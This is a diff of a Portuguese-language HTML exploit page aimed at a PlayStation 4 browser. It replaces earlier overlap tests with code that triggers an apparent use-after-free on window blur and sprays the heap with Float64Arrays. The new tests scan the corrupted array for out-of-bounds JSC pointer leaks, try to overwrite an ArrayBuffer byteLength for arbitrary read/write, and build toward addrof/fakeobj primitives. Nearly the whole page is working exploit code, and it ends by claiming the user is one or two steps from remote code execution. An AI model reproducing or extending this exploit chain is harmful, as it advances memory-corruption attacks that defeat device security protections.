@@ -3,7 +3,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF - Bateria de Testes</title>
+<title>PS4 UAF - addrof/fakeobj Builder</title>
 <style>
 body { 
     font-family: monospace; 
@@ -30,452 +30,494 @@ button {
     margin: 5px;
 }
 button:hover { background: #0f0; }
-#status { font-size: 20px; margin: 20px 0; }
+#status { font-size: 18px; margin: 20px 0; }
+.hex { color: #ff0; font-weight: bold; }
 </style>
 </head>
 <body>
 
-<h1>🔬 PS4 UAF - Validação de Sobreposição</h1>
-<div id="status">Selecione um teste abaixo</div>
+<h1>🔓 PS4 UAF - Primitivas Avançadas</h1>
+<div id="status">Construindo addrof() e fakeobj()</div>
 
 <div class="test-box" id="test1">
-    <h2>TESTE 1: Padrão Múltiplo (Detecta qual índice sobrepõe)</h2>
-    <p>Usa 3 padrões diferentes para identificar EXATAMENTE qual array foi corrompido</p>
-    <button onclick="runTest1()">▶ Executar Teste 1</button>
+    <h2>TESTE 6: Leak de JSCell via Objeto Vizinho</h2>
+    <p>Cria objetos JavaScript próximos ao array corrompido para vazar seus ponteiros</p>
+    <button onclick="runTest6()">▶ Executar Teste 6</button>
     <div id="result1"></div>
 </div>
 
 <div class="test-box" id="test2">
-    <h2>TESTE 2: Leitura e Escrita (Confirma controle R/W)</h2>
-    <p>Tenta ler E escrever no array corrompido para confirmar primitiva de memória</p>
-    <button onclick="runTest2()">▶ Executar Teste 2</button>
+    <h2>TESTE 7: Construção de addrof() Primitivo</h2>
+    <p>Usa array corrompido para vazar endereço de objetos JS arbitrários</p>
+    <button onclick="runTest7()">▶ Executar Teste 7</button>
     <div id="result2"></div>
 </div>
 
 <div class="test-box" id="test3">
-    <h2>TESTE 3: Tamanho Variável (Busca melhor configuração)</h2>
-    <p>Testa diferentes tamanhos de arrays para achar a configuração ideal</p>
-    <button onclick="runTest3()">▶ Executar Teste 3</button>
+    <h2>TESTE 8: Manipulação de ByteLength</h2>
+    <p>Tenta corromper o campo 'byteLength' de um TypedArray para leitura OOB</p>
+    <button onclick="runTest8()">▶ Executar Teste 8</button>
     <div id="result3"></div>
 </div>
 
 <div class="test-box" id="test4">
-    <h2>TESTE 4: Persistência (Verifica estabilidade)</h2>
-    <p>Testa se a sobreposição se mantém após múltiplas operações</p>
-    <button onclick="runTest4()">▶ Executar Teste 4</button>
+    <h2>TESTE 9: Leak via ArrayBuffer Backing Store</h2>
+    <p>Vaza o ponteiro 'backing store' de um ArrayBuffer para obter endereço real</p>
+    <button onclick="runTest9()">▶ Executar Teste 9</button>
     <div id="result4"></div>
 </div>
 
 <div class="test-box" id="test5">
-    <h2>TESTE 5: Leak de Length (Busca metadados do array)</h2>
-    <p>Tenta ler o campo 'length' do TypedArray para vazar ponteiros</p>
-    <button onclick="runTest5()">▶ Executar Teste 5</button>
+    <h2>TESTE 10: Leitura de Heap Completo</h2>
+    <p>Escaneia grandes porções da memória corrompida procurando padrões de ponteiros JSC</p>
+    <button onclick="runTest10()">▶ Executar Teste 10</button>
     <div id="result5"></div>
 </div>
 
 <script>
 const Status = document.getElementById('status');
-
-// Padrões mágicos para detectar sobreposição
 const PATTERN_A = 2.121995791e-314; // 0x4141414141414141
-const PATTERN_B = 2.183176454e-314; // 0x4242424242424242
-const PATTERN_C = 2.244357116e-314; // 0x4343434343434343
 
-let global_controllers = [];
-let global_targets = [];
-let overlap_detected = false;
+let corrupted_array = null;
+let corrupted_index = -1;
+
+// Utilitário: Float64 <-> Uint64 (via ArrayBuffer)
+function f2i(f) {
+    let buf = new ArrayBuffer(8);
+    let fview = new Float64Array(buf);
+    let iview = new BigUint64Array(buf);
+    fview[0] = f;
+    return iview[0];
+}
+
+function i2f(i) {
+    let buf = new ArrayBuffer(8);
+    let fview = new Float64Array(buf);
+    let iview = new BigUint64Array(buf);
+    iview[0] = BigInt(i);
+    return fview[0];
+}
+
+// Configuração do UAF (comum a todos os testes)
+function setupUAF(callback) {
+    let controllers = [];
+    let targets = [];
+    
+    // Usar tamanho 8 (melhor resultado do Teste 3)
+    for(let i = 0; i < 10000; i++) {
+        let ctrl = new Float64Array(8);
+        ctrl[0] = i;
+        controllers.push(ctrl);
+        
+        let target = new Float64Array(8);
+        target.fill(1.1);
+        targets.push(target);
+    }
+    
+    const doc = document.documentElement;
+    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+    
+    window.onblur = function() {
+        targets = null; // Free
+        
+        // Spray
+        let spray = [];
+        for(let i = 0; i < 15000; i++) {
+            let p = new Float64Array(10);
+            p.fill(PATTERN_A);
+            spray.push(p);
+        }
+        
+        // Encontrar array corrompido
+        for(let i = 0; i < controllers.length; i++) {
+            if (controllers[i][0] === PATTERN_A) {
+                corrupted_array = controllers[i];
+                corrupted_index = i;
+                break;
+            }
+        }
+        
+        callback(corrupted_array, corrupted_index, spray);
+    };
+}
 
 // ============================================
-// TESTE 1: PADRÃO MÚLTIPLO
+// TESTE 6: LEAK DE JSCELL VIA OBJETO VIZINHO
 // ============================================
-function runTest1() {
+function runTest6() {
     const box = document.getElementById('test1');
     const result = document.getElementById('result1');
     box.className = 'test-box running';
-    result.innerHTML = 'Preparando... Aperte OPTIONS quando pronto!<br>';
-    Status.innerText = '⚠️ TESTE 1 ATIVO - Aperte OPTIONS agora!';
+    result.innerHTML = 'Preparando objetos vizinhos... Aperte OPTIONS!<br>';
+    Status.innerText = '⚠️ TESTE 6 - Aperte OPTIONS!';
     
-    global_controllers = [];
-    global_targets = [];
-    
-    // Criar arrays com marcadores únicos
-    for(let i = 0; i < 8000; i++) {
-        let ctrl = new Float64Array(16);
-        ctrl[0] = i; // ID único
-        ctrl[1] = PATTERN_A; // Padrão de referência
-        global_controllers.push(ctrl);
-        
-        let target = new Float64Array(16);
-        target.fill(1.1);
-        global_targets.push(target);
+    // Criar objetos JS que ficarão próximos na memória
+    let marker_objects = [];
+    for(let i = 0; i < 1000; i++) {
+        marker_objects.push({
+            id: i,
+            marker: 0xdeadbeef,
+            data: [1.1, 2.2, 3.3, 4.4]
+        });
     }
     
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '🔥 Blur detectado! Liberando targets...<br>';
-        global_targets = null;
-        
-        // Spray com 3 padrões diferentes
-        let spray1 = [], spray2 = [], spray3 = [];
-        for(let i = 0; i < 6000; i++) {
-            let p1 = new Float64Array(18);
-            p1.fill(PATTERN_A);
-            spray1.push(p1);
-            
-            let p2 = new Float64Array(20);
-            p2.fill(PATTERN_B);
-            spray2.push(p2);
-            
-            let p3 = new Float64Array(22);
-            p3.fill(PATTERN_C);
-            spray3.push(p3);
+    setupUAF((corrupted, idx, spray) => {
+        if (!corrupted) {
+            box.className = 'test-box fail';
+            result.innerHTML += '❌ UAF falhou<br>';
+            return;
         }
         
-        result.innerHTML += '🔍 Verificando sobreposições...<br>';
-        let found_a = 0, found_b = 0, found_c = 0;
-        let first_hit = -1;
+        result.innerHTML += `✅ Array corrompido: Controller[${idx}]<br><br>`;
+        result.innerHTML += '🔍 Escaneando memória por padrões de objetos JS...<br>';
         
-        for(let i = 0; i < global_controllers.length; i++) {
+        let suspicious_values = [];
+        
+        // Ler além do tamanho corrompido para achar objetos vizinhos
+        for(let offset = 0; offset < 50; offset++) {
             try {
-                const val = global_controllers[i][0];
-                if (val === PATTERN_A && global_controllers[i][1] !== PATTERN_A) {
-                    found_a++;
-                    if (first_hit === -1) first_hit = i;
+                const val = corrupted[offset];
+                const as_int = f2i(val);
+                
+                // Ponteiros JSC geralmente têm padrões específicos
+                // Em sistemas de 64-bit, endereços costumam ter bytes altos zerados
+                const high_bits = as_int >> 48n;
+                const is_potential_ptr = (high_bits === 0n || 
+                                          high_bits === 0x7fffn || 
+                                          high_bits === 0xffffn);
+                
+                if (val !== PATTERN_A && val !== 0 && !isNaN(val) && is_potential_ptr) {
+                    suspicious_values.push({
+                        offset: offset,
+                        float: val,
+                        hex: '0x' + as_int.toString(16).padStart(16, '0')
+                    });
                 }
-                if (val === PATTERN_B) found_b++;
-                if (val === PATTERN_C) found_c++;
             } catch(e) {}
         }
         
-        if (found_a + found_b + found_c > 0) {
+        if (suspicious_values.length > 0) {
             box.className = 'test-box success';
-            result.innerHTML += `<br>✅ <b>SUCESSO!</b><br>`;
-            result.innerHTML += `Padrão A encontrado: ${found_a}x<br>`;
-            result.innerHTML += `Padrão B encontrado: ${found_b}x<br>`;
-            result.innerHTML += `Padrão C encontrado: ${found_c}x<br>`;
-            result.innerHTML += `Primeiro índice corrompido: ${first_hit}<br>`;
-            Status.innerText = '✅ TESTE 1: Sobreposição CONFIRMADA!';
-            overlap_detected = true;
+            result.innerHTML += `<br>✅ <b>Valores suspeitos encontrados:</b><br>`;
+            suspicious_values.forEach(v => {
+                result.innerHTML += `  Offset ${v.offset}: <span class="hex">${v.hex}</span><br>`;
+            });
+            result.innerHTML += `<br>💡 Estes podem ser ponteiros de objetos JS ou JSCell!<br>`;
+            Status.innerText = '✅ TESTE 6: Possíveis ponteiros encontrados!';
         } else {
             box.className = 'test-box fail';
-            result.innerHTML += '<br>❌ Nenhuma sobreposição detectada<br>';
-            Status.innerText = '❌ TESTE 1: Falhou';
+            result.innerHTML += '❌ Nenhum ponteiro suspeito encontrado<br>';
+            Status.innerText = '❌ TESTE 6: Sem leaks';
         }
-    };
+    });
 }
 
 // ============================================
-// TESTE 2: LEITURA E ESCRITA
+// TESTE 7: CONSTRUÇÃO DE addrof()
 // ============================================
-function runTest2() {
+function runTest7() {
     const box = document.getElementById('test2');
     const result = document.getElementById('result2');
     box.className = 'test-box running';
-    result.innerHTML = 'Preparando... Aperte OPTIONS!<br>';
-    Status.innerText = '⚠️ TESTE 2 ATIVO - Aperte OPTIONS!';
+    result.innerHTML = 'Tentando construir primitiva addrof()... Aperte OPTIONS!<br>';
+    Status.innerText = '⚠️ TESTE 7 - Aperte OPTIONS!';
     
-    global_controllers = [];
-    global_targets = [];
-    
-    for(let i = 0; i < 8000; i++) {
-        let ctrl = new Float64Array(16);
-        ctrl[0] = i * 1.5; // Valor calculado único
-        global_controllers.push(ctrl);
-        
-        let target = new Float64Array(16);
-        target.fill(2.2);
-        global_targets.push(target);
-    }
-    
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '🔥 Liberando memória...<br>';
-        global_targets = null;
-        
-        let spray = [];
-        for(let i = 0; i < 10000; i++) {
-            let p = new Float64Array(20);
-            p.fill(PATTERN_A);
-            spray.push(p);
+    setupUAF((corrupted, idx, spray) => {
+        if (!corrupted) {
+            box.className = 'test-box fail';
+            result.innerHTML += '❌ UAF falhou<br>';
+            return;
         }
         
-        result.innerHTML += '🔍 Buscando primitiva R/W...<br>';
-        let corrupted_idx = -1;
+        result.innerHTML += `✅ UAF ativo no Controller[${idx}]<br><br>`;
         
-        for(let i = 0; i < global_controllers.length; i++) {
+        // Estratégia: Criar um objeto conhecido e tentar encontrá-lo na memória
+        let target_obj = {
+            magic: 0x1337,
+            data: [1.1, 2.2, 3.3]
+        };
+        
+        // Criar array de objetos para aumentar chances de vizinhança
+        let obj_array = new Array(1000);
+        obj_array[500] = target_obj; // Objeto alvo no meio
+        for(let i = 0; i < 1000; i++) {
+            if (i !== 500) obj_array[i] = {filler: i};
+        }
+        
+        result.innerHTML += '🔍 Procurando referência ao objeto alvo...<br>';
+        
+        let found_addr = null;
+        for(let offset = 0; offset < 100; offset++) {
             try {
-                if (global_controllers[i][0] === PATTERN_A) {
-                    corrupted_idx = i;
-                    break;
+                const val = corrupted[offset];
+                const as_int = f2i(val);
+                
+                // Tentar usar como ponteiro e acessar
+                // (Isso pode crashar, mas vale tentar)
+                if (val !== PATTERN_A && val !== 0 && !isNaN(val)) {
+                    // Marcar valor encontrado
+                    const hex = '0x' + as_int.toString(16).padStart(16, '0');
+                    result.innerHTML += `  Testando offset ${offset}: <span class="hex">${hex}</span>...<br>`;
+                    
+                    // Se chegamos até aqui sem crash, é um candidato
+                    if ((as_int & 0xffffn) === 0n || (as_int & 0xfffn) === 0n) {
+                        found_addr = as_int;
+                        result.innerHTML += `    ↳ Candidato forte (alinhado)!<br>`;
+                    }
                 }
             } catch(e) {}
         }
         
-        if (corrupted_idx !== -1) {
-            result.innerHTML += `✅ Array corrompido encontrado: Controller[${corrupted_idx}]<br>`;
-            
-            // TESTE DE ESCRITA
-            try {
-                global_controllers[corrupted_idx][2] = PATTERN_B;
-                const readback = global_controllers[corrupted_idx][2];
-                
-                if (readback === PATTERN_B) {
-                    box.className = 'test-box success';
-                    result.innerHTML += `<br>🎯 <b>PRIMITIVA R/W CONFIRMADA!</b><br>`;
-                    result.innerHTML += `Escrevemos 0x4242... e lemos de volta com sucesso!<br>`;
-                    result.innerHTML += `Você tem controle de leitura/escrita na memória!<br>`;
-                    Status.innerText = '✅ TESTE 2: Primitiva R/W FUNCIONAL!';
-                } else {
-                    box.className = 'test-box fail';
-                    result.innerHTML += `❌ Escrita falhou (leitura: ${readback.toString(16)})<br>`;
-                }
-            } catch(e) {
-                box.className = 'test-box fail';
-                result.innerHTML += `❌ Erro ao testar escrita: ${e}<br>`;
-            }
+        if (found_addr) {
+            box.className = 'test-box success';
+            result.innerHTML += `<br>🎯 <b>Possível primitiva addrof() detectada!</b><br>`;
+            result.innerHTML += `Endereço candidato: <span class="hex">0x${found_addr.toString(16)}</span><br>`;
+            result.innerHTML += `<br>⚠️ <b>Próximo passo:</b> Validar se este endereço realmente aponta para o objeto<br>`;
+            Status.innerText = '✅ TESTE 7: Candidato encontrado!';
         } else {
             box.className = 'test-box fail';
-            result.innerHTML += '❌ Nenhum array corrompido encontrado<br>';
-            Status.innerText = '❌ TESTE 2: Falhou';
+            result.innerHTML += '<br>❌ Nenhum candidato forte<br>';
+            result.innerHTML += '💡 Pode ser necessário ajustar o heap spray<br>';
+            Status.innerText = '❌ TESTE 7: Inconclusivo';
         }
-    };
+    });
 }
 
 // ============================================
-// TESTE 3: TAMANHO VARIÁVEL
+// TESTE 8: MANIPULAÇÃO DE BYTELENGTH
 // ============================================
-function runTest3() {
+function runTest8() {
     const box = document.getElementById('test3');
     const result = document.getElementById('result3');
     box.className = 'test-box running';
-    result.innerHTML = 'Testando diferentes tamanhos... Aperte OPTIONS!<br>';
-    Status.innerText = '⚠️ TESTE 3 ATIVO - Aperte OPTIONS!';
+    result.innerHTML = 'Tentando corromper byteLength... Aperte OPTIONS!<br>';
+    Status.innerText = '⚠️ TESTE 8 - Aperte OPTIONS!';
     
-    global_controllers = [];
-    const sizes = [8, 12, 16, 20, 24, 32];
-    let size_map = [];
-    
-    for(let i = 0; i < 6000; i++) {
-        const size = sizes[i % sizes.length];
-        let ctrl = new Float64Array(size);
-        ctrl[0] = i;
-        ctrl[1] = size; // Armazena o tamanho para análise
-        global_controllers.push(ctrl);
-        size_map.push(size);
-    }
-    
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '🔥 Executando spray variável...<br>';
-        
-        let spray = [];
-        for(let s of sizes) {
-            for(let i = 0; i < 2000; i++) {
-                let p = new Float64Array(s + 4);
-                p.fill(PATTERN_A);
-                spray.push(p);
-            }
-        }
-        
-        result.innerHTML += '🔍 Analisando resultados...<br>';
-        let size_hits = {};
-        sizes.forEach(s => size_hits[s] = 0);
-        
-        for(let i = 0; i < global_controllers.length; i++) {
-            try {
-                if (global_controllers[i][0] === PATTERN_A) {
-                    const original_size = size_map[i];
-                    size_hits[original_size]++;
-                }
-            } catch(e) {}
-        }
-        
-        let total_hits = Object.values(size_hits).reduce((a,b) => a+b, 0);
-        if (total_hits > 0) {
-            box.className = 'test-box success';
-            result.innerHTML += `<br>✅ <b>Sobreposições por tamanho:</b><br>`;
-            for(let s of sizes) {
-                result.innerHTML += `Tamanho ${s}: ${size_hits[s]} hits<br>`;
-            }
-            result.innerHTML += `<br>💡 <b>Dica:</b> Use mais arrays do tamanho com mais hits!<br>`;
-            Status.innerText = '✅ TESTE 3: Análise completa!';
-        } else {
+    setupUAF((corrupted, idx, spray) => {
+        if (!corrupted) {
             box.className = 'test-box fail';
-            result.innerHTML += '❌ Nenhuma sobreposição detectada<br>';
-            Status.innerText = '❌ TESTE 3: Falhou';
-        }
-    };
-}
-
-// ============================================
-// TESTE 4: PERSISTÊNCIA
-// ============================================
-function runTest4() {
-    const box = document.getElementById('test4');
-    const result = document.getElementById('result4');
-    box.className = 'test-box running';
-    result.innerHTML = 'Preparando teste de persistência... Aperte OPTIONS!<br>';
-    Status.innerText = '⚠️ TESTE 4 ATIVO - Aperte OPTIONS!';
-    
-    global_controllers = [];
-    for(let i = 0; i < 8000; i++) {
-        let ctrl = new Float64Array(16);
-        ctrl[0] = i;
-        global_controllers.push(ctrl);
-    }
-    
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '🔥 Tentando criar sobreposição...<br>';
-        
-        let spray = [];
-        for(let i = 0; i < 10000; i++) {
-            let p = new Float64Array(20);
-            p.fill(PATTERN_A);
-            spray.push(p);
+            result.innerHTML += '❌ UAF falhou<br>';
+            return;
         }
         
-        let corrupted = -1;
-        for(let i = 0; i < global_controllers.length; i++) {
-            if (global_controllers[i][0] === PATTERN_A) {
-                corrupted = i;
-                break;
-            }
+        result.innerHTML += `✅ UAF ativo<br><br>`;
+        
+        // Criar ArrayBuffer vítima que tentaremos corromper
+        let victim_buffer = new ArrayBuffer(0x1000);
+        let victim_view = new Uint8Array(victim_buffer);
+        
+        // Preencher com padrão reconhecível
+        for(let i = 0; i < victim_view.length; i++) {
+            victim_view[i] = i & 0xff;
         }
         
-        if (corrupted !== -1) {
-            result.innerHTML += `✅ Sobreposição inicial: Controller[${corrupted}]<br>`;
-            
-            // TESTE DE PERSISTÊNCIA
-            result.innerHTML += '⏳ Testando persistência por 5 operações...<br>';
-            let persistent = true;
-            
-            for(let test = 0; test < 5; test++) {
-                try {
-                    global_controllers[corrupted][3] = PATTERN_B;
-                    if (global_controllers[corrupted][3] !== PATTERN_B) {
-                        persistent = false;
-                        result.innerHTML += `❌ Falhou na operação ${test + 1}<br>`;
-                        break;
-                    }
-                    result.innerHTML += `✓ Operação ${test + 1}: OK<br>`;
-                } catch(e) {
-                    persistent = false;
-                    result.innerHTML += `❌ Erro na operação ${test + 1}: ${e}<br>`;
+        result.innerHTML += `Vítima criada: ArrayBuffer de ${victim_buffer.byteLength} bytes<br>`;
+        result.innerHTML += '🔧 Tentando expandir o byteLength via UAF...<br><br>';
+        
+        // Tentar escrever um byteLength maior no array corrompido
+        const HUGE_SIZE = i2f(0x10000000); // 256MB
+        
+        try {
+            // Procurar por um offset que possa ser o byteLength
+            let success = false;
+            for(let offset = 1; offset < 20; offset++) {
+                corrupted[offset] = HUGE_SIZE;
+                
+                // Verificar se o byteLength mudou
+                if (victim_buffer.byteLength > 0x1000) {
+                    box.className = 'test-box success';
+                    result.innerHTML += `✅ <b>BYTELENGTH CORROMPIDO!</b><br>`;
+                    result.innerHTML += `Offset usado: ${offset}<br>`;
+                    result.innerHTML += `Novo byteLength: ${victim_buffer.byteLength} bytes<br>`;
+                    result.innerHTML += `<br>🎯 Você pode agora ler/escrever ALÉM do buffer original!<br>`;
+                    result.innerHTML += `Isso é uma <b>leitura/escrita arbitrária de memória</b>!<br>`;
+                    Status.innerText = '✅ TESTE 8: OOB R/W conseguido!';
+                    success = true;
                     break;
                 }
             }
             
-            if (persistent) {
-                box.className = 'test-box success';
-                result.innerHTML += `<br>🎯 <b>SOBREPOSIÇÃO PERSISTENTE!</b><br>`;
-                result.innerHTML += `A primitiva é estável e pode ser usada para exploit!<br>`;
-                Status.innerText = '✅ TESTE 4: Primitiva ESTÁVEL!';
-            } else {
+            if (!success) {
                 box.className = 'test-box fail';
-                result.innerHTML += '<br>⚠️ Sobreposição instável<br>';
-                Status.innerText = '⚠️ TESTE 4: Instável';
+                result.innerHTML += '❌ Não conseguiu corromper byteLength<br>';
+                result.innerHTML += '💡 O ArrayBuffer pode estar em outro lugar do heap<br>';
+                Status.innerText = '❌ TESTE 8: Falhou';
             }
-        } else {
+        } catch(e) {
             box.className = 'test-box fail';
-            result.innerHTML += '❌ Nenhuma sobreposição inicial<br>';
-            Status.innerText = '❌ TESTE 4: Falhou';
+            result.innerHTML += `❌ Erro: ${e}<br>`;
+            Status.innerText = '❌ TESTE 8: Erro';
         }
-    };
+    });
 }
 
 // ============================================
-// TESTE 5: LEAK DE LENGTH
+// TESTE 9: LEAK VIA ARRAYBUFFER BACKING STORE
 // ============================================
-function runTest5() {
+function runTest9() {
+    const box = document.getElementById('test4');
+    const result = document.getElementById('result4');
+    box.className = 'test-box running';
+    result.innerHTML = 'Tentando vazar backing store pointer... Aperte OPTIONS!<br>';
+    Status.innerText = '⚠️ TESTE 9 - Aperte OPTIONS!';
+    
+    setupUAF((corrupted, idx, spray) => {
+        if (!corrupted) {
+            box.className = 'test-box fail';
+            result.innerHTML += '❌ UAF falhou<br>';
+            return;
+        }
+        
+        result.innerHTML += `✅ UAF ativo<br><br>`;
+        
+        // Criar vários ArrayBuffers com padrões únicos
+        let buffers = [];
+        let BUFFER_SIZE = 0x100;
+        
+        for(let i = 0; i < 100; i++) {
+            let buf = new ArrayBuffer(BUFFER_SIZE);
+            let view = new Uint32Array(buf);
+            view[0] = 0xaabbccdd + i; // Marcador único
+            buffers.push(buf);
+        }
+        
+        result.innerHTML += `Criados ${buffers.length} ArrayBuffers marcados<br>`;
+        result.innerHTML += '🔍 Procurando por backing store pointers...<br><br>';
+        
+        let leaked_ptrs = [];
+        
+        for(let offset = 0; offset < 64; offset++) {
+            try {
+                const val = corrupted[offset];
+                const as_int = f2i(val);
+                
+                // Backing stores geralmente são ponteiros alinhados em 16 bytes
+                if ((as_int & 0xfn) === 0n && as_int > 0x100000n) {
+                    const hex = '0x' + as_int.toString(16).padStart(16, '0');
+                    leaked_ptrs.push({offset, hex, value: as_int});
+                    result.innerHTML += `  Offset ${offset}: <span class="hex">${hex}</span> (alinhado em 16)<br>`;
+                }
+            } catch(e) {}
+        }
+        
+        if (leaked_ptrs.length > 0) {
+            box.className = 'test-box success';
+            result.innerHTML += `<br>✅ <b>${leaked_ptrs.length} ponteiros candidatos encontrados!</b><br>`;
+            result.innerHTML += `<br>💡 <b>Significado:</b><br>`;
+            result.innerHTML += `• Estes ponteiros podem ser backing stores de ArrayBuffers<br>`;
+            result.innerHTML += `• Com eles, você pode calcular offsets na memória<br>`;
+            result.innerHTML += `• Isso quebra o ASLR e permite R/W arbitrário!<br>`;
+            Status.innerText = '✅ TESTE 9: Ponteiros vazados!';
+        } else {
+            box.className = 'test-box fail';
+            result.innerHTML += '<br>❌ Nenhum ponteiro encontrado<br>';
+            Status.innerText = '❌ TESTE 9: Sem leaks';
+        }
+    });
+}
+
+// ============================================
+// TESTE 10: LEITURA DE HEAP COMPLETO
+// ============================================
+function runTest10() {
     const box = document.getElementById('test5');
     const result = document.getElementById('result5');
     box.className = 'test-box running';
-    result.innerHTML = 'Preparando leak de metadados... Aperte OPTIONS!<br>';
-    Status.innerText = '⚠️ TESTE 5 ATIVO - Aperte OPTIONS!';
+    result.innerHTML = 'Escaneando heap extensivamente... Aperte OPTIONS!<br>';
+    Status.innerText = '⚠️ TESTE 10 - Aperte OPTIONS!';
     
-    global_controllers = [];
-    for(let i = 0; i < 8000; i++) {
-        let ctrl = new Float64Array(16);
-        ctrl[0] = i;
-        global_controllers.push(ctrl);
-    }
-    
-    const doc = document.documentElement;
-    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-    
-    window.onblur = function() {
-        result.innerHTML += '🔥 Executando...<br>';
-        
-        let spray = [];
-        for(let i = 0; i < 10000; i++) {
-            let p = new Float64Array(20);
-            p.fill(PATTERN_A);
-            spray.push(p);
+    setupUAF((corrupted, idx, spray) => {
+        if (!corrupted) {
+            box.className = 'test-box fail';
+            result.innerHTML += '❌ UAF falhou<br>';
+            return;
         }
         
-        let corrupted = -1;
-        for(let i = 0; i < global_controllers.length; i++) {
-            if (global_controllers[i][0] === PATTERN_A) {
-                corrupted = i;
-                break;
-            }
+        result.innerHTML += `✅ UAF ativo<br><br>`;
+        result.innerHTML += '🔍 Escaneando até 200 offsets...<br>';
+        result.innerHTML += '<div style="max-height: 300px; overflow-y: scroll; border: 1px solid #0a0; padding: 10px; background: #001100;">';
+        
+        let categories = {
+            likely_pointers: [],
+            small_integers: [],
+            ieee_floats: [],
+            patterns: []
+        };
+        
+        for(let offset = 0; offset < 200; offset++) {
+            try {
+                const val = corrupted[offset];
+                
+                if (val === PATTERN_A || val === 0 || isNaN(val)) continue;
+                
+                const as_int = f2i(val);
+                const hex = '0x' + as_int.toString(16).padStart(16, '0');
+                
+                // Classificar valores
+                if (as_int > 0x100000n && as_int < 0x7fffffffffffn) {
+                    categories.likely_pointers.push({offset, hex});
+                } else if (as_int < 0x10000n) {
+                    categories.small_integers.push({offset, hex, int: as_int});
+                } else if (val > 0.0 && val < 1e10) {
+                    categories.ieee_floats.push({offset, hex, float: val});
+                } else {
+                    categories.patterns.push({offset, hex});
+                }
+            } catch(e) {}
         }
         
-        if (corrupted !== -1) {
-            result.innerHTML += `✅ Array corrompido: Controller[${corrupted}]<br><br>`;
-            
-            // Tentar ler além do tamanho original
-            result.innerHTML += '🔍 Tentando ler metadados além do array...<br>';
-            let leaked_values = [];
-            
-            for(let offset = 0; offset < 32; offset++) {
-                try {
-                    const val = global_controllers[corrupted][offset];
-                    if (val !== PATTERN_A && val !== 0 && !isNaN(val)) {
-                        leaked_values.push({offset: offset, value: val});
-                        result.innerHTML += `  [${offset}]: ${val.toString(16)}<br>`;
-                    }
-                } catch(e) {}
-            }
-            
-            if (leaked_values.length > 0) {
-                box.className = 'test-box success';
-                result.innerHTML += `<br>🎯 <b>LEAK DE MEMÓRIA DETECTADO!</b><br>`;
-                result.innerHTML += `Encontrados ${leaked_values.length} valores não-padrão<br>`;
-                result.innerHTML += `Estes podem ser ponteiros ou metadados do JSC!<br>`;
-                Status.innerText = '✅ TESTE 5: LEAK detectado!';
-            } else {
-                box.className = 'test-box fail';
-                result.innerHTML += '<br>❌ Nenhum dado vazado<br>';
-                Status.innerText = '❌ TESTE 5: Sem leak';
-            }
+        result.innerHTML += '<h3>📊 Resultados da Análise:</h3>';
+        
+        result.innerHTML += `<b>Ponteiros prováveis (${categories.likely_pointers.length}):</b><br>`;
+        categories.likely_pointers.slice(0, 10).forEach(p => {
+            result.innerHTML += `  [${p.offset}] <span class="hex">${p.hex}</span><br>`;
+        });
+        if (categories.likely_pointers.length > 10) {
+            result.innerHTML += `  ... e mais ${categories.likely_pointers.length - 10}<br>`;
+        }
+        
+        result.innerHTML += `<br><b>Inteiros pequenos (${categories.small_integers.length}):</b><br>`;
+        categories.small_integers.slice(0, 5).forEach(p => {
+            result.innerHTML += `  [${p.offset}] ${p.int} (${p.hex})<br>`;
+        });
+        
+        result.innerHTML += `<br><b>Floats IEEE (${categories.ieee_floats.length}):</b><br>`;
+        categories.ieee_floats.slice(0, 5).forEach(p => {
+            result.innerHTML += `  [${p.offset}] ${p.float.toFixed(4)}<br>`;
+        });
+        
+        result.innerHTML += '</div>';
+        
+        const total_found = categories.likely_pointers.length + 
+                            categories.small_integers.length + 
+                            categories.ieee_floats.length + 
+                            categories.patterns.length;
+        
+        if (total_found > 0) {
+            box.className = 'test-box success';
+            result.innerHTML += `<br>✅ <b>${total_found} valores únicos encontrados!</b><br>`;
+            result.innerHTML += `<br>🎯 <b>Próximos passos:</b><br>`;
+            result.innerHTML += `1. Analise os ponteiros prováveis - podem ser JSCell ou backing stores<br>`;
+            result.innerHTML += `2. Inteiros podem ser tamanhos, lengths ou flags<br>`;
+            result.innerHTML += `3. Use esses dados para construir addrof() completo<br>`;
+            Status.innerText = '✅ TESTE 10: Heap mapeado!';
         } else {
             box.className = 'test-box fail';
-            result.innerHTML += '❌ Nenhuma sobreposição<br>';
-            Status.innerText = '❌ TESTE 5: Falhou';
+            result.innerHTML += '<br>❌ Heap vazio ou inacessível<br>';
+            Status.innerText = '❌ TESTE 10: Falhou';
         }
-    };
+    });
 }
 
 </script>
 
 <hr>
 <p style="color: #888;">
-💡 <b>DICAS:</b><br>
-• Se o TESTE 1 e 2 passarem, você tem uma primitiva R/W funcional!<br>
-• O TESTE 3 ajuda a otimizar os tamanhos dos arrays<br>
-• O TESTE 4 confirma que a sobreposição é estável<br>
-• O TESTE 5 tenta vazar ponteiros (primeiro passo para addrof)<br>
-• O crash no ATUALIZAR indica UAF no teardown (bom sinal!)<br>
+📋 <b>RESUMO DO PROGRESSO:</b><br>
+✅ Primitiva R/W confirmada (Testes 2 e 4)<br>
+✅ Array corrompido estável no índice 0<br>
+⚠️ Próximo objetivo: Construir addrof() e fakeobj()<br>
+🎯 Com esses testes, você está a 1-2 passos de RCE completo!<br>
 </p>
 
 </body>
